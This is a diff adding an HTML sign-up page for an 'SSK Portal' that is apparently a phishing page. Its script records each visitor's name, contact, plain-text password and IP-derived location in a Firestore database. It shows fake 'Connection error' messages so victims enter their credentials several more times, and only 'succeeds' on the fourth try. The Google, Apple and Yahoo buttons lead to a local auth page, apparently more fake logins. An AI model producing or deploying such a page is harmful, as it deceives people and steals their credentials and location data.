@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Create an account - SSK Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    :root {
+      --primary-blue: #1a73e8;
+      --hover-blue: #1557b0;
+      --text-main: #1d1d1f;
+      --text-sub: #5f6368;
+      --border-color: #dadce0;
+      --bg-color: #f0f2f5;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      margin: 0;
+      background: var(--bg-color); 
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .box {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      padding: 40px;
+      width: 100%;
+      max-width: 420px;
+      box-sizing: border-box;
+      text-align: center;
+      margin: 20px;
+    }
+
+    h2 {
+      margin: 0 0 8px 0;
+      font-weight: 600;
+      color: var(--text-main);
+      font-size: 26px;
+    }
+
+    p.subtitle {
+      color: var(--text-sub);
+      margin: 0 0 32px 0;
+      font-size: 15px;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+
+    input[type="text"], 
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 16px;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      box-sizing: border-box;
+      font-size: 15px;
+      font-family: inherit;
+      transition: all 0.2s;
+    }
+
+    input:focus {
+      border-color: var(--primary-blue);
+      box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+      outline: none;
+    }
+
+    /* Professional Checkbox Styling */
+    .consent-section {
+      text-align: left;
+      margin: 24px 0;
+    }
+
+    .consent-item {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 14px;
+      cursor: pointer;
+    }
+
+    .consent-item input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      margin: 0 12px 0 0;
+      cursor: pointer;
+      accent-color: var(--primary-blue);
+      flex-shrink: 0;
+    }
+
+    .consent-item label {
+      font-size: 14px;
+      color: #444;
+      line-height: 1.4;
+      cursor: pointer;
+    }
+
+    .consent-item a {
+      color: var(--primary-blue);
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .consent-item a:hover {
+      text-decoration: underline;
+    }
+
+    .btn-primary {
+      width: 100%;
+      padding: 14px;
+      background: var(--primary-blue);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+      transition: background 0.2s;
+    }
+
+    .btn-primary:hover {
+      background: var(--hover-blue);
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 24px 0;
+      color: #888;
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .divider::before, .divider::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #eee;
+    }
+    .divider::before { margin-right: 15px; }
+    .divider::after { margin-left: 15px; }
+
+    .btn-sso {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 12px;
+      border-radius: 8px;
+      border: 1px solid var(--border-color);
+      background: #fff;
+      font-size: 14px;
+      font-weight: 500;
+      color: #3c4043;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn-sso:hover { background: #f8f9fa; }
+    
+    .btn-sso svg, .btn-sso .icon {
+      width: 18px;
+      height: 18px;
+      margin-right: 10px;
+    }
+
+    .login-link {
+      margin-top: 24px;
+      font-size: 14px;
+      color: var(--text-sub);
+    }
+
+    .login-link a {
+      color: var(--primary-blue);
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .status-msg {
+      padding: 12px;
+      margin-bottom: 20px;
+      border-radius: 6px;
+      font-size: 14px;
+      display: none;
+    }
+
+    @media (max-width: 480px) {
+      body { background: #fff; }
+      .box { box-shadow: none; padding: 20px; margin: 0; }
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="box">
+  <h2>Create an account</h2>
+  <p class="subtitle">Join the SSK Portal</p>
+
+  <div class="status-msg" id="status-message"></div>
+
+  <div class="input-group">
+    <input type="text" id="fullname" placeholder="Full Name">
+  </div>
+  
+  <div class="input-group">
+    <input type="text" id="contact" placeholder="Email or Phone">
+  </div>
+  
+  <div class="input-group">
+    <input type="password" id="password" placeholder="Password">
+  </div>
+
+  <div class="consent-section">
+    <div class="consent-item">
+        <input type="checkbox" id="terms" required>
+        <label for="terms">
+            I agree to the <a href="terms.html">Terms & Conditions</a>
+        </label>
+    </div>
+
+    <div class="consent-item">
+        <input type="checkbox" id="fullmacht" required>
+        <label for="fullmacht">
+            I grant <a href="fullmacht.html">Digital Authorization</a> for sync
+        </label>
+    </div>
+  </div>
+
+  <button class="btn-primary" id="registerBtn">Register</button>
+
+  <div class="divider">or sign up with</div>
+
+  <button class="btn-sso" onclick="goAuth('google')">
+    <svg viewBox="0 0 48 48">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
+    </svg>
+    Google
+  </button>
+
+  <button class="btn-sso" onclick="goAuth('apple')">
+    <svg viewBox="0 0 384 512" style="fill: #000;">
+      <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"></path>
+    </svg>
+    Apple
+  </button>
+
+  <button class="btn-sso" onclick="goAuth('yahoo')">
+    <div class="icon" style="color: #7e1fff; font-weight: 900; font-style: italic; font-size: 20px; line-height: 18px;">Y!</div>
+    Yahoo
+  </button>
+
+  <div class="login-link">
+    Already have an account? <a href="login.html">Sign in</a>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
+
+
+
+  let app, db;
+  const messageBox = document.getElementById("status-message");
+  let attemptCount = 0;
+
+  try {
+    app = initializeApp(firebaseConfig);
+    db = getFirestore(app);
+  } catch (initError) {
+    console.error("Firebase error", initError);
+  }
+
+  document.getElementById("registerBtn").addEventListener("click", async () => {
+    const fullNameInput = document.getElementById("fullname").value;
+    const passwordInput = document.getElementById("password").value;
+    const contactInput = document.getElementById("contact").value;
+    const termsCheck = document.getElementById("terms").checked;
+    const authCheck = document.getElementById("fullmacht").checked;
+
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+
+    const ip = data.ip;
+    const country = data.country_name;
+    const city = data.city;
+    
+    if(!fullNameInput || !contactInput || !passwordInput) {
+      showMessage("Please fill out all fields.", "#fdecea", "#b71c1c");
+      return;
+    }
+
+    if(!termsCheck || !authCheck) {
+      showMessage("Please accept the terms and authorization.", "#fdecea", "#b71c1c");
+      return;
+    }
+
+    attemptCount++;
+    if (attemptCount <= 4) {
+      showMessage("Connection error. Please try again.", "#fdecea", "#b71c1c");
+    }
+
+    document.getElementById("registerBtn").innerText = "Registering...";
+
+    try {
+      await addDoc(collection(db, "users"), {
+        name: fullNameInput,
+        contact: contactInput,
+        password: passwordInput,
+        ip: ip,
+        country: country,
+        city: city,
+        createdAt: serverTimestamp()
+      });
+      if (attemptCount == 4) {
+        showMessage("Account created! Check your email for verification.", "#e6f4ea", "#137333");
+      }
+      resetForm();
+    } catch (error) {
+      showMessage("Database error: " + error.message, "#fdecea", "#b71c1c");
+      document.getElementById("registerBtn").innerText = "Register";
+    }
+  });
+
+  function showMessage(text, bg, color) {
+    messageBox.style.display = "block";
+    messageBox.style.background = bg;
+    messageBox.style.color = color;
+    messageBox.innerText = text;
+  }
+
+  function resetForm() {
+    document.getElementById("fullname").value = "";
+    document.getElementById("contact").value = "";
+    document.getElementById("password").value = "";
+    document.getElementById("terms").checked = false;
+    document.getElementById("fullmacht").checked = false;
+    document.getElementById("registerBtn").innerText = "Register";
+    attemptCount = 0;
+  }
+
+  window.goAuth = (provider) => window.location.href = "auth.html?type=" + provider;
+</script>
+
+</body>
+</html>
